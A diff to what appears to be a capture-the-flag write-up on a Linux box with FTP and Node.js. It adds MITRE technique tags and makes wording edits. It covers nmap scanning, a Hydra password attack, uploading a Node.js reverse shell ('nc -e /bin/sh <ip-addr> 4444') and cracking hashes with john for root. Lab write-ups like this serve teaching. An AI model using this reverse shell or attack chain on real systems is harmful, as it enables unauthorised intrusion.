@@ -4,11 +4,11 @@
 **Category = FTP, Node.js, Linux**
 
 ## Summary
-Uploaded reverseshell through an open ftp service. Escalated privileges by abusing an insecure password.
+Uploaded reverse-shell through an open ftp service. Escalated privileges by abusing an insecure password.
 
 ## Enumeration
-**[MITRE Technique: T1595]**
-Use `nmap -p- <ip-addr>` in order to scan all ports. Then use `nmap -sVC -p 21,3000 <ip-addr>` in order to perform a deeper scan on the target and its running services.
+**[MITRE Technique: T1595, T1595.002]**
+Use `nmap -p- <ip-addr>` in order to scan all ports. Then use `nmap -sVC -p 21,3000 <ip-addr>` in order to perform a deep scan on the target and its running services.
 
 ![](assets/recon.png)
   Use `nc -nvv <ip-addr>` to grab the FTP service banners, leading to a username.
@@ -17,12 +17,12 @@ Use `nmap -p- <ip-addr>` in order to scan all ports. Then use `nmap -sVC -p 21,3
 
 
 ## Exploitation
-**[MITRE Technique: T1110.001, T1105]**
+**[MITRE Technique: T1110.001, T1105, T1003.008]**
  Use Hydra to dictionary attack the FTP server which then gives us the password for a.clark. Use those credentials to log into the ftp service.
 
  ![](assets/userpass.png)
  
-  Listing out directories and files produces nothing. Start a netcat listener, create a *.js* file and write a javascript reverse-shell into the file: `require('child_process').exec('nc -e /bin/sh <ip-addr> 4444')`. Use `chmod +777` in order to make the uploaded shell executable. Navigate to *http://<ip-addr\>/script.js* in the browser. This will give you a very basic shell.
+  Listing out directories and files produces nothing. Start a netcat listener, create a *.js* file and write a javascript reverse-shell into the file: `require('child_process').exec('nc -e /bin/sh <ip-addr> 4444')`. Use `chmod 777` in order to make the uploaded shell executable. Navigate to *http://<ip-addr\>/script.js* in the browser. This will give you a very basic shell.
  
   ![](assets/FirstFlag.png) 
   
@@ -31,6 +31,7 @@ Use `nmap -p- <ip-addr>` in order to scan all ports. Then use `nmap -sVC -p 21,3
 ![](assets/hashtransfer.png)
 
 ## Privilege Escalation
+**[MITRE Technique: T1110.002, T1078.003]**
 After transferring the hashes, use `john` to crack them:
 
 ![](assets/rootcrack.png)
